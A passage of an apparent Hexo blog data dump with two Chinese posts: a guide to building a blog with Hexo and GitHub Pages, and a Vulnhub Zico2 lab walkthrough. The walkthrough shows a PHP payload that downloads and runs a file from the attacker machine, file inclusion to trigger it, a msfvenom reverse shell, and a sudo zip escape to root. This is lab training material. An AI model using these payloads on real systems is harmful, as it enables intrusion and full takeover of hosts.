server`，运行博客。运行后会监听在localhost:4000，访问即可看到博客页面。\n\n## 0x02 Hexo配置\n\n**修改主题**\n\nHexo拥有众多主题，本博客采用[Yelee](https://github.com/MOxFIVE/hexo-theme-yelee)。\n\n首先到Github上下载或使用`git clone`将主题下载并放到themes目录下。\n\n然后修改hexo配置文件_config.yml，找到`theme:landscape`修改为`theme:yelee`。\n\n关于主题的一些定制化，例如头像等，找到Yelee主题目录下的_config.yml配置文件进行更改。\n\n## 0x03 Hexo联合Git Pages部署\n\n**1.关于Git Pages**:\n\nGitHub Pages 本用于介绍托管在 GitHub 的项目,他会为每个用户免费分配一个github.io域的域名。使用该域名可以访问同名的代码仓库。\n\n**2.Git Pages配置**\n\n首先，注册并拥有Github账号。\n\n然后，创建一个新的代码仓库。并使用`xxx.github.io`作为仓库名字。\n\n![](build-blog\\br.jpg)\n\n然后，配置Hexo的部署方式为Git。找到Hexo配置文件_config.yml ，修改`deploy`:\n\n```\ndeploy:\n  type: git\n  repo: https://github.com/sh4douu/sh4douu.github.io.git  #这里是上一步创建的仓库连接。\n```\n\n**3.部署hexo到git pages：**\n\n执行部署命令前，先安装用于部署的插件：`npm install hexo-deployer-git --save`\n\n执行部署：`hexo   d`   //等同于hexo deploy\n\n> 所谓的部署，即将hexo用于存放渲染完毕的静态文件的public目录push到刚才在github创建的仓库。\n>\n> 然后通过Git Pages分配的域名，实现博客网站的部署访问。\n\n**4.Hexo写博客的流程**\n\n首先，编写Markdown文章。使用`hexo new \"title\"`命令，该命令会以scaffolds目录下的post.md作为文章模板在source\\posts目录下生成title.md。编写该markdown文件即可。\n\n编写完成后，要将markdown文件渲染生成静态文件。执行命令：`hexo   g`。执行该命令后，会在public目录下生成渲染完毕的静态文件。\n\n最后，将生成的静态文件push到github上进行部署。使用命令：`hexo    d `。\n\n可能会因为缓存等原因造成某些问题，可以使用命令`hexo  clean`进行清扫。该命令会清除掉所有已渲染的文件及其缓存。清除后再重新生成、部署。\n\n## 0x04 绑定个人域名\n\nGit Pages分配的域名是`xxx.github.io`样式的，若想要使用自己的域名，可通过CNAME解析实现。\n\n首先，注册购买域名，如：sakuxa.com。\n\n然后设置解析，添加一条CNAME记录即可：\n\n![](build-blog\\cname.jpg)\n\n然后在source目录下创建一个文件，名称为CNAME，文件无后缀。文件的内容写入域名，如：sakuxa.com\n\n然后再到Github上，找到前面创建的仓库的`settings`，进入并找到自定义域名输入框填入自己的域名即可：\n\n![](build-blog\\git.jpg)\n\n\n\n**参考连接**\n\nhttps://blog.csdn.net/sinat_37781304/article/details/82729029\n\nhttps://github.com/MOxFIVE/hexo-theme-yelee","source":"_posts/build-blog.md","raw":"---\ntitle: 博客搭建记录 Node.js + Hexo + Yelee + Git Pages\ndate: 2019-02-21 14:32:04\ntags: \n\t- 技术 \n\t- 环境搭建\ncategories: \n\t- Misc\n---\n\n## 0x00 概述\n\n本博客采用Node.js + Hexo + Yelee + Git Pages方案。\n\n博客运作的原理是，通过Hexo将写好的Markdown文章渲染为静态网页，然后将静态网页托管到Github上，使用Github的Git Pages来部署博客网站。\n\n博客搭建可分为四部分：\n\n- Hexo安装及使用\n- Hexo配置\n- Hexo联合Git Pages部署\n- 绑定个人域名（可选）\n\n<!-- more -->\n\n## 0x01 Hexo安装\n\n> Hexo 是一个快速、简洁且高效的博客框架。\n>\n> Hexo 使用 [Markdown](http://daringfireball.net/projects/markdown/)（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n**1.安装Node.js与Git**\n\n*Node*.*js* 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。而Hexo是基于Node.js的，因此在安装Hexo之前要先安装Node.js。直接去官网下载安装程序安装即可。\n\nGit用于进行版本控制。\n\n使用命令`node -v`及其`git version`验证node.js与Git是否安装成功，运行命令出现版本即证明成功安装。\n\n**2.安装Hexo**\n\n安装命令：\n\n`npm install -g hexo-cli`\n\n> npm是 JavaScript 世界的包管理工具,并且是 Node.js 平台的默认包管理工具。\n\n初始化博客：\n\n`hexo init myblog`\t\t //myblog是可以任意取的。\n\n安装依赖：\n\n`cd myblog`\t\t //进入这个myblog文件夹\n`npm install`\t\t//npm会根据目录下的package.json文件安装所需要的依赖。\n\n完成以上操作后，会创建myblog项目目录，目录结构如下(只列举重要的)：\n\n> - public                            //该文件夹存放的是通过Hexo渲染markdown文章得到的最终静态文件。\n> - scaffolds                      //该文件夹下存放文章、页面等的模板。\n> - source\\posts              //存放Markdown文章，Hexo要渲染的markdown文件就在该目录下。\n> - themes                     //存放网页主题的目录。\n> - _config.yml             //Hexo配置文件。\n\n运行博客：\n\n`hexo   g` \t\t     //等价于`hexo generate`，用于生成文章。即将posts目录下的Markdown文件渲染为静态文件并保存到public目录下。\n\n`hexo  s`\t\t   //等价于`hexo server`，运行博客。运行后会监听在localhost:4000，访问即可看到博客页面。\n\n## 0x02 Hexo配置\n\n**修改主题**\n\nHexo拥有众多主题，本博客采用[Yelee](https://github.com/MOxFIVE/hexo-theme-yelee)。\n\n首先到Github上下载或使用`git clone`将主题下载并放到themes目录下。\n\n然后修改hexo配置文件_config.yml，找到`theme:landscape`修改为`theme:yelee`。\n\n关于主题的一些定制化，例如头像等，找到Yelee主题目录下的_config.yml配置文件进行更改。\n\n## 0x03 Hexo联合Git Pages部署\n\n**1.关于Git Pages**:\n\nGitHub Pages 本用于介绍托管在 GitHub 的项目,他会为每个用户免费分配一个github.io域的域名。使用该域名可以访问同名的代码仓库。\n\n**2.Git Pages配置**\n\n首先，注册并拥有Github账号。\n\n然后，创建一个新的代码仓库。并使用`xxx.github.io`作为仓库名字。\n\n![](build-blog\\br.jpg)\n\n然后，配置Hexo的部署方式为Git。找到Hexo配置文件_config.yml ，修改`deploy`:\n\n```\ndeploy:\n  type: git\n  repo: https://github.com/sh4douu/sh4douu.github.io.git  #这里是上一步创建的仓库连接。\n```\n\n**3.部署hexo到git pages：**\n\n执行部署命令前，先安装用于部署的插件：`npm install hexo-deployer-git --save`\n\n执行部署：`hexo   d`   //等同于hexo deploy\n\n> 所谓的部署，即将hexo用于存放渲染完毕的静态文件的public目录push到刚才在github创建的仓库。\n>\n> 然后通过Git Pages分配的域名，实现博客网站的部署访问。\n\n**4.Hexo写博客的流程**\n\n首先，编写Markdown文章。使用`hexo new \"title\"`命令，该命令会以scaffolds目录下的post.md作为文章模板在source\\posts目录下生成title.md。编写该markdown文件即可。\n\n编写完成后，要将markdown文件渲染生成静态文件。执行命令：`hexo   g`。执行该命令后，会在public目录下生成渲染完毕的静态文件。\n\n最后，将生成的静态文件push到github上进行部署。使用命令：`hexo    d `。\n\n可能会因为缓存等原因造成某些问题，可以使用命令`hexo  clean`进行清扫。该命令会清除掉所有已渲染的文件及其缓存。清除后再重新生成、部署。\n\n## 0x04 绑定个人域名\n\nGit Pages分配的域名是`xxx.github.io`样式的，若想要使用自己的域名，可通过CNAME解析实现。\n\n首先，注册购买域名，如：sakuxa.com。\n\n然后设置解析，添加一条CNAME记录即可：\n\n![](build-blog\\cname.jpg)\n\n然后在source目录下创建一个文件，名称为CNAME，文件无后缀。文件的内容写入域名，如：sakuxa.com\n\n然后再到Github上，找到前面创建的仓库的`settings`，进入并找到自定义域名输入框填入自己的域名即可：\n\n![](build-blog\\git.jpg)\n\n\n\n**参考连接**\n\nhttps://blog.csdn.net/sinat_37781304/article/details/82729029\n\nhttps://github.com/MOxFIVE/hexo-theme-yelee","slug":"build-blog","published":1,"updated":"2019-02-25T01:33:39.931Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83kz002f7or00ou7xxvl","content":"<h2 id=\"0x00-概述\"><a href=\"#0x00-概述\" class=\"headerlink\" title=\"0x00 概述\"></a>0x00 概述</h2><p>本博客采用Node.js + Hexo + Yelee + Git Pages方案。</p>\n<p>博客运作的原理是，通过Hexo将写好的Markdown文章渲染为静态网页，然后将静态网页托管到Github上，使用Github的Git Pages来部署博客网站。</p>\n<p>博客搭建可分为四部分：</p>\n<ul>\n<li>Hexo安装及使用</li>\n<li>Hexo配置</li>\n<li>Hexo联合Git Pages部署</li>\n<li>绑定个人域名（可选）</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"0x01-Hexo安装\"><a href=\"#0x01-Hexo安装\" class=\"headerlink\" title=\"0x01 Hexo安装\"></a>0x01 Hexo安装</h2><blockquote>\n<p>Hexo 是一个快速、简洁且高效的博客框架。</p>\n<p>Hexo 使用 <a href=\"http://daringfireball.net/projects/markdown/\" target=\"_blank\" rel=\"noopener\">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>\n</blockquote>\n<p><strong>1.安装Node.js与Git</strong></p>\n<p><em>Node</em>.<em>js</em> 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。而Hexo是基于Node.js的，因此在安装Hexo之前要先安装Node.js。直接去官网下载安装程序安装即可。</p>\n<p>Git用于进行版本控制。</p>\n<p>使用命令<code>node -v</code>及其<code>git version</code>验证node.js与Git是否安装成功，运行命令出现版本即证明成功安装。</p>\n<p><strong>2.安装Hexo</strong></p>\n<p>安装命令：</p>\n<p><code>npm install -g hexo-cli</code></p>\n<blockquote>\n<p>npm是 JavaScript 世界的包管理工具,并且是 Node.js 平台的默认包管理工具。</p>\n</blockquote>\n<p>初始化博客：</p>\n<p><code>hexo init myblog</code>         //myblog是可以任意取的。</p>\n<p>安装依赖：</p>\n<p><code>cd myblog</code>         //进入这个myblog文件夹<br><code>npm install</code>        //npm会根据目录下的package.json文件安装所需要的依赖。</p>\n<p>完成以上操作后，会创建myblog项目目录，目录结构如下(只列举重要的)：</p>\n<blockquote>\n<ul>\n<li>public                            //该文件夹存放的是通过Hexo渲染markdown文章得到的最终静态文件。</li>\n<li>scaffolds                      //该文件夹下存放文章、页面等的模板。</li>\n<li>source\\posts              //存放Markdown文章，Hexo要渲染的markdown文件就在该目录下。</li>\n<li>themes                     //存放网页主题的目录。</li>\n<li>_config.yml             //Hexo配置文件。</li>\n</ul>\n</blockquote>\n<p>运行博客：</p>\n<p><code>hexo   g</code>              //等价于<code>hexo generate</code>，用于生成文章。即将posts目录下的Markdown文件渲染为静态文件并保存到public目录下。</p>\n<p><code>hexo  s</code>           //等价于<code>hexo server</code>，运行博客。运行后会监听在localhost:4000，访问即可看到博客页面。</p>\n<h2 id=\"0x02-Hexo配置\"><a href=\"#0x02-Hexo配置\" class=\"headerlink\" title=\"0x02 Hexo配置\"></a>0x02 Hexo配置</h2><p><strong>修改主题</strong></p>\n<p>Hexo拥有众多主题，本博客采用<a href=\"https://github.com/MOxFIVE/hexo-theme-yelee\" target=\"_blank\" rel=\"noopener\">Yelee</a>。</p>\n<p>首先到Github上下载或使用<code>git clone</code>将主题下载并放到themes目录下。</p>\n<p>然后修改hexo配置文件_config.yml，找到<code>theme:landscape</code>修改为<code>theme:yelee</code>。</p>\n<p>关于主题的一些定制化，例如头像等，找到Yelee主题目录下的_config.yml配置文件进行更改。</p>\n<h2 id=\"0x03-Hexo联合Git-Pages部署\"><a href=\"#0x03-Hexo联合Git-Pages部署\" class=\"headerlink\" title=\"0x03 Hexo联合Git Pages部署\"></a>0x03 Hexo联合Git Pages部署</h2><p><strong>1.关于Git Pages</strong>:</p>\n<p>GitHub Pages 本用于介绍托管在 GitHub 的项目,他会为每个用户免费分配一个github.io域的域名。使用该域名可以访问同名的代码仓库。</p>\n<p><strong>2.Git Pages配置</strong></p>\n<p>首先，注册并拥有Github账号。</p>\n<p>然后，创建一个新的代码仓库。并使用<code>xxx.github.io</code>作为仓库名字。</p>\n<p><img src=\"/2019/02/21/build-blog/br.jpg\" alt></p>\n<p>然后，配置Hexo的部署方式为Git。找到Hexo配置文件_config.yml ，修改<code>deploy</code>:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repo: https://github.com/sh4douu/sh4douu.github.io.git  #这里是上一步创建的仓库连接。</span><br></pre></td></tr></table></figure>\n<p><strong>3.部署hexo到git pages：</strong></p>\n<p>执行部署命令前，先安装用于部署的插件：<code>npm install hexo-deployer-git --save</code></p>\n<p>执行部署：<code>hexo   d</code>   //等同于hexo deploy</p>\n<blockquote>\n<p>所谓的部署，即将hexo用于存放渲染完毕的静态文件的public目录push到刚才在github创建的仓库。</p>\n<p>然后通过Git Pages分配的域名，实现博客网站的部署访问。</p>\n</blockquote>\n<p><strong>4.Hexo写博客的流程</strong></p>\n<p>首先，编写Markdown文章。使用<code>hexo new &quot;title&quot;</code>命令，该命令会以scaffolds目录下的post.md作为文章模板在source\\posts目录下生成title.md。编写该markdown文件即可。</p>\n<p>编写完成后，要将markdown文件渲染生成静态文件。执行命令：<code>hexo   g</code>。执行该命令后，会在public目录下生成渲染完毕的静态文件。</p>\n<p>最后，将生成的静态文件push到github上进行部署。使用命令：<code>hexo    d</code>。</p>\n<p>可能会因为缓存等原因造成某些问题，可以使用命令<code>hexo  clean</code>进行清扫。该命令会清除掉所有已渲染的文件及其缓存。清除后再重新生成、部署。</p>\n<h2 id=\"0x04-绑定个人域名\"><a href=\"#0x04-绑定个人域名\" class=\"headerlink\" title=\"0x04 绑定个人域名\"></a>0x04 绑定个人域名</h2><p>Git Pages分配的域名是<code>xxx.github.io</code>样式的，若想要使用自己的域名，可通过CNAME解析实现。</p>\n<p>首先，注册购买域名，如：sakuxa.com。</p>\n<p>然后设置解析，添加一条CNAME记录即可：</p>\n<p><img src=\"/2019/02/21/build-blog/cname.jpg\" alt></p>\n<p>然后在source目录下创建一个文件，名称为CNAME，文件无后缀。文件的内容写入域名，如：sakuxa.com</p>\n<p>然后再到Github上，找到前面创建的仓库的<code>settings</code>，进入并找到自定义域名输入框填入自己的域名即可：</p>\n<p><img src=\"/2019/02/21/build-blog/git.jpg\" alt></p>\n<p><strong>参考连接</strong></p>\n<p><a href=\"https://blog.csdn.net/sinat_37781304/article/details/82729029\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/sinat_37781304/article/details/82729029</a></p>\n<p><a href=\"https://github.com/MOxFIVE/hexo-theme-yelee\" target=\"_blank\" rel=\"noopener\">https://github.com/MOxFIVE/hexo-theme-yelee</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-概述\"><a href=\"#0x00-概述\" class=\"headerlink\" title=\"0x00 概述\"></a>0x00 概述</h2><p>本博客采用Node.js + Hexo + Yelee + Git Pages方案。</p>\n<p>博客运作的原理是，通过Hexo将写好的Markdown文章渲染为静态网页，然后将静态网页托管到Github上，使用Github的Git Pages来部署博客网站。</p>\n<p>博客搭建可分为四部分：</p>\n<ul>\n<li>Hexo安装及使用</li>\n<li>Hexo配置</li>\n<li>Hexo联合Git Pages部署</li>\n<li>绑定个人域名（可选）</li>\n</ul>","more":"<h2 id=\"0x01-Hexo安装\"><a href=\"#0x01-Hexo安装\" class=\"headerlink\" title=\"0x01 Hexo安装\"></a>0x01 Hexo安装</h2><blockquote>\n<p>Hexo 是一个快速、简洁且高效的博客框架。</p>\n<p>Hexo 使用 <a href=\"http://daringfireball.net/projects/markdown/\" target=\"_blank\" rel=\"noopener\">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>\n</blockquote>\n<p><strong>1.安装Node.js与Git</strong></p>\n<p><em>Node</em>.<em>js</em> 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。而Hexo是基于Node.js的，因此在安装Hexo之前要先安装Node.js。直接去官网下载安装程序安装即可。</p>\n<p>Git用于进行版本控制。</p>\n<p>使用命令<code>node -v</code>及其<code>git version</code>验证node.js与Git是否安装成功，运行命令出现版本即证明成功安装。</p>\n<p><strong>2.安装Hexo</strong></p>\n<p>安装命令：</p>\n<p><code>npm install -g hexo-cli</code></p>\n<blockquote>\n<p>npm是 JavaScript 世界的包管理工具,并且是 Node.js 平台的默认包管理工具。</p>\n</blockquote>\n<p>初始化博客：</p>\n<p><code>hexo init myblog</code>         //myblog是可以任意取的。</p>\n<p>安装依赖：</p>\n<p><code>cd myblog</code>         //进入这个myblog文件夹<br><code>npm install</code>        //npm会根据目录下的package.json文件安装所需要的依赖。</p>\n<p>完成以上操作后，会创建myblog项目目录，目录结构如下(只列举重要的)：</p>\n<blockquote>\n<ul>\n<li>public                            //该文件夹存放的是通过Hexo渲染markdown文章得到的最终静态文件。</li>\n<li>scaffolds                      //该文件夹下存放文章、页面等的模板。</li>\n<li>source\\posts              //存放Markdown文章，Hexo要渲染的markdown文件就在该目录下。</li>\n<li>themes                     //存放网页主题的目录。</li>\n<li>_config.yml             //Hexo配置文件。</li>\n</ul>\n</blockquote>\n<p>运行博客：</p>\n<p><code>hexo   g</code>              //等价于<code>hexo generate</code>，用于生成文章。即将posts目录下的Markdown文件渲染为静态文件并保存到public目录下。</p>\n<p><code>hexo  s</code>           //等价于<code>hexo server</code>，运行博客。运行后会监听在localhost:4000，访问即可看到博客页面。</p>\n<h2 id=\"0x02-Hexo配置\"><a href=\"#0x02-Hexo配置\" class=\"headerlink\" title=\"0x02 Hexo配置\"></a>0x02 Hexo配置</h2><p><strong>修改主题</strong></p>\n<p>Hexo拥有众多主题，本博客采用<a href=\"https://github.com/MOxFIVE/hexo-theme-yelee\" target=\"_blank\" rel=\"noopener\">Yelee</a>。</p>\n<p>首先到Github上下载或使用<code>git clone</code>将主题下载并放到themes目录下。</p>\n<p>然后修改hexo配置文件_config.yml，找到<code>theme:landscape</code>修改为<code>theme:yelee</code>。</p>\n<p>关于主题的一些定制化，例如头像等，找到Yelee主题目录下的_config.yml配置文件进行更改。</p>\n<h2 id=\"0x03-Hexo联合Git-Pages部署\"><a href=\"#0x03-Hexo联合Git-Pages部署\" class=\"headerlink\" title=\"0x03 Hexo联合Git Pages部署\"></a>0x03 Hexo联合Git Pages部署</h2><p><strong>1.关于Git Pages</strong>:</p>\n<p>GitHub Pages 本用于介绍托管在 GitHub 的项目,他会为每个用户免费分配一个github.io域的域名。使用该域名可以访问同名的代码仓库。</p>\n<p><strong>2.Git Pages配置</strong></p>\n<p>首先，注册并拥有Github账号。</p>\n<p>然后，创建一个新的代码仓库。并使用<code>xxx.github.io</code>作为仓库名字。</p>\n<p><img src=\"/2019/02/21/build-blog/br.jpg\" alt></p>\n<p>然后，配置Hexo的部署方式为Git。找到Hexo配置文件_config.yml ，修改<code>deploy</code>:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repo: https://github.com/sh4douu/sh4douu.github.io.git  #这里是上一步创建的仓库连接。</span><br></pre></td></tr></table></figure>\n<p><strong>3.部署hexo到git pages：</strong></p>\n<p>执行部署命令前，先安装用于部署的插件：<code>npm install hexo-deployer-git --save</code></p>\n<p>执行部署：<code>hexo   d</code>   //等同于hexo deploy</p>\n<blockquote>\n<p>所谓的部署，即将hexo用于存放渲染完毕的静态文件的public目录push到刚才在github创建的仓库。</p>\n<p>然后通过Git Pages分配的域名，实现博客网站的部署访问。</p>\n</blockquote>\n<p><strong>4.Hexo写博客的流程</strong></p>\n<p>首先，编写Markdown文章。使用<code>hexo new &quot;title&quot;</code>命令，该命令会以scaffolds目录下的post.md作为文章模板在source\\posts目录下生成title.md。编写该markdown文件即可。</p>\n<p>编写完成后，要将markdown文件渲染生成静态文件。执行命令：<code>hexo   g</code>。执行该命令后，会在public目录下生成渲染完毕的静态文件。</p>\n<p>最后，将生成的静态文件push到github上进行部署。使用命令：<code>hexo    d</code>。</p>\n<p>可能会因为缓存等原因造成某些问题，可以使用命令<code>hexo  clean</code>进行清扫。该命令会清除掉所有已渲染的文件及其缓存。清除后再重新生成、部署。</p>\n<h2 id=\"0x04-绑定个人域名\"><a href=\"#0x04-绑定个人域名\" class=\"headerlink\" title=\"0x04 绑定个人域名\"></a>0x04 绑定个人域名</h2><p>Git Pages分配的域名是<code>xxx.github.io</code>样式的，若想要使用自己的域名，可通过CNAME解析实现。</p>\n<p>首先，注册购买域名，如：sakuxa.com。</p>\n<p>然后设置解析，添加一条CNAME记录即可：</p>\n<p><img src=\"/2019/02/21/build-blog/cname.jpg\" alt></p>\n<p>然后在source目录下创建一个文件，名称为CNAME，文件无后缀。文件的内容写入域名，如：sakuxa.com</p>\n<p>然后再到Github上，找到前面创建的仓库的<code>settings</code>，进入并找到自定义域名输入框填入自己的域名即可：</p>\n<p><img src=\"/2019/02/21/build-blog/git.jpg\" alt></p>\n<p><strong>参考连接</strong></p>\n<p><a href=\"https://blog.csdn.net/sinat_37781304/article/details/82729029\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/sinat_37781304/article/details/82729029</a></p>\n<p><a href=\"https://github.com/MOxFIVE/hexo-theme-yelee\" target=\"_blank\" rel=\"noopener\">https://github.com/MOxFIVE/hexo-theme-yelee</a></p>"},{"title":"Vulnhub靶机渗透笔记——Zico2","date":"2019-02-26T02:30:34.000Z","_content":"\n## 0x00 环境\n\n- 靶机：[Zico2](https://www.vulnhub.com/series/zico2,137/#modal210download)\n- 攻击机：Kali Linux\n- VirtualBox\n  - 网络连接方式：host-only、DHCP\n- 目标：boot2root获取flag。\n\n<!-- more -->\n\n## 0x01 信息收集与漏洞挖掘\n\n**1.主机发现：**`nmap -sn 192.168.110.0/24`\n\n靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。\n\n![](hack-zico\\discovery.png)\n\n**2.端口探测：**`nmap -Pn -sV -n -T4 -p- 192.168.110.3`\n\n端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。\n\n还确定了靶机系统为Ubuntu Linux、Web容器为Apache。\n\n![](hack-zico\\port.png)\n\n**3.Web服务**\n\n- 服务探测：`whatweb http://192.168.110.3 -a 3`\n\n![](hack-zico\\whatweb.png)\n\n- 目录爆破：`dirb http://192.168.110.3`\n\n爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。\n\n![](hack-zico\\dirb.png)\n\n![](hack-zico\\dbadmin.png)\n\n访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。\n\n进入数据库管理页面后可获得以下信息：\n\n> 数据库路径：`/usr/databases/`\n>\n> 数据库名：`test_users`\n>\n> 数据表：`info`\n\n![](hack-zico\\1.png)\n\n查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到[somd5](https://www.somd5.com/)网站解密，得到结果：\n\n> root  34kroot34\n>\n> zico  zico2215@\n\n将得到的两个用户名密码尝试进行SSH登录，结果失败。\n\n- 漏洞扫描\n\n使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：`http://192.168.110.3/view.php?page=tools.html`\n\n![](hack-zico\\2.png)\n\n验证漏洞，尝试包含/etc/passwd文件，发现成功包含。\n\n![](hack-zico\\3.png)\n\n## 0x02 Getshell\n\nsqlite属于单文件数据库，类似Access数据库。\n\n**1.思路一**\n\n尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建`../../var/www/html/shell.php`，`/`会被过滤，该方法不可行。\n\n**2.思路二：文件包含Getshell**\n\n先尝试通过日志文件`/var/log/apache2/access.log`，先访问`http://192.168.110.3/<?php phpinfo();?>`，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。\n\n包含数据库文件Getshell\n\n首先通过phpLiteAdmin向info表插入一条数据：`<?php system(\"cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell\");?>`，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。\n\n![](hack-zico\\4.png)\n\n然后在攻击机上使用msfvenon生成shell文件：`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf > shell`\n\n在shell文件所在的路径建立一个简单HTTP服务器：`python -m SimpleHTTPServer 80`\n\n设置msf监听，`use exploit/multi/hander`、`set payload linux/x86/meterpreter/reverse_tcp`、`set lhost 192.168.110.4`。\n\n访问连接`http://192.168.110.3/view.php?page=../../usr/databases/test_users`，然后会得到一个meterpreter会话。\n\n![](hack-zico\\5.png)\n\n## 0x03 权限提升\n\n获得靶机shell后查看用户，发现不是root，需要提权。\n\n![](hack-zico\\7.png)\n\n首先查看`/etc/passwd`文件，找出id大于1000的用户，发现值得关注的用户有root、zico。\n\n![](hack-zico\\8.png)\n\n查找属主为zico的文件：`find / -user zico 2> /dev/null`，执行后结果过多。直接`cd /home/zico`到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：`sWfCsfJSPV9H3AmQzw8`。\n\n![](hack-zico\\9.png)\n\n尝试使用该用户名密码登录SSH：`ssh zico@sWfCsfJSPV9H3AmQzw8`。成功登录。\n\n使用`sudo -l`命令查看zico用户可以执行的root命令。发现可以执行`/bin/tar`、`/usr/bin/zip`。\n\n![](hack-zico\\10.png)\n\n执行`touch /tmp/exploit`、`sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=\"bash -c /bin/sh\"`\n\n成功提权至root。\n\n![](hack-zico\\11.png)\n\n获取flag，进入root用户家目录，flag在目录下的flag.txt文件。\n\n![](hack-zico\\12.png)\n\n**另一种提权方式**\n\n获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。\n\n![](hack-zico\\13.png)\n\n到[Exploit-DB](https://www.exploit-db.com/search)搜索内核提权漏洞，并下载Exp到靶机编译执行。\n\n![](hack-zico\\14.png)\n\n## 0x04 总结\n\n- 文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。\n- Python2搭建简单HTTP服务器来传文件：`python -m SimpleHTTPServer 80`\n- 上传/执行文件遇权限问题时，可传到`/tmp`目录。\n\n**参考连接**\n\nhttps://www.colabug.com/1925534.html","source":"_posts/hack-zico.md","raw":"---\ntitle: Vulnhub靶机渗透笔记——Zico2 \ndate: 2019-02-26 10:30:34\ntags:\n\t- 文件包含\n\t- Getshell\n\t- 权限提升\n\t- 靶机\ncategories:\n\t- Vulnhub\n---\n\n## 0x00 环境\n\n- 靶机：[Zico2](https://www.vulnhub.com/series/zico2,137/#modal210download)\n- 攻击机：Kali Linux\n- VirtualBox\n  - 网络连接方式：host-only、DHCP\n- 目标：boot2root获取flag。\n\n<!-- more -->\n\n## 0x01 信息收集与漏洞挖掘\n\n**1.主机发现：**`nmap -sn 192.168.110.0/24`\n\n靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。\n\n![](hack-zico\\discovery.png)\n\n**2.端口探测：**`nmap -Pn -sV -n -T4 -p- 192.168.110.3`\n\n端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。\n\n还确定了靶机系统为Ubuntu Linux、Web容器为Apache。\n\n![](hack-zico\\port.png)\n\n**3.Web服务**\n\n- 服务探测：`whatweb http://192.168.110.3 -a 3`\n\n![](hack-zico\\whatweb.png)\n\n- 目录爆破：`dirb http://192.168.110.3`\n\n爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。\n\n![](hack-zico\\dirb.png)\n\n![](hack-zico\\dbadmin.png)\n\n访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。\n\n进入数据库管理页面后可获得以下信息：\n\n> 数据库路径：`/usr/databases/`\n>\n> 数据库名：`test_users`\n>\n> 数据表：`info`\n\n![](hack-zico\\1.png)\n\n查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到[somd5](https://www.somd5.com/)网站解密，得到结果：\n\n> root  34kroot34\n>\n> zico  zico2215@\n\n将得到的两个用户名密码尝试进行SSH登录，结果失败。\n\n- 漏洞扫描\n\n使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：`http://192.168.110.3/view.php?page=tools.html`\n\n![](hack-zico\\2.png)\n\n验证漏洞，尝试包含/etc/passwd文件，发现成功包含。\n\n![](hack-zico\\3.png)\n\n## 0x02 Getshell\n\nsqlite属于单文件数据库，类似Access数据库。\n\n**1.思路一**\n\n尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建`../../var/www/html/shell.php`，`/`会被过滤，该方法不可行。\n\n**2.思路二：文件包含Getshell**\n\n先尝试通过日志文件`/var/log/apache2/access.log`，先访问`http://192.168.110.3/<?php phpinfo();?>`，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。\n\n包含数据库文件Getshell\n\n首先通过phpLiteAdmin向info表插入一条数据：`<?php system(\"cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell\");?>`，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。\n\n![](hack-zico\\4.png)\n\n然后在攻击机上使用msfvenon生成shell文件：`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf > shell`\n\n在shell文件所在的路径建立一个简单HTTP服务器：`python -m SimpleHTTPServer 80`\n\n设置msf监听，`use exploit/multi/hander`、`set payload linux/x86/meterpreter/reverse_tcp`、`set lhost 192.168.110.4`。\n\n访问连接`http://192.168.110.3/view.php?page=../../usr/databases/test_users`，然后会得到一个meterpreter会话。\n\n![](hack-zico\\5.png)\n\n## 0x03 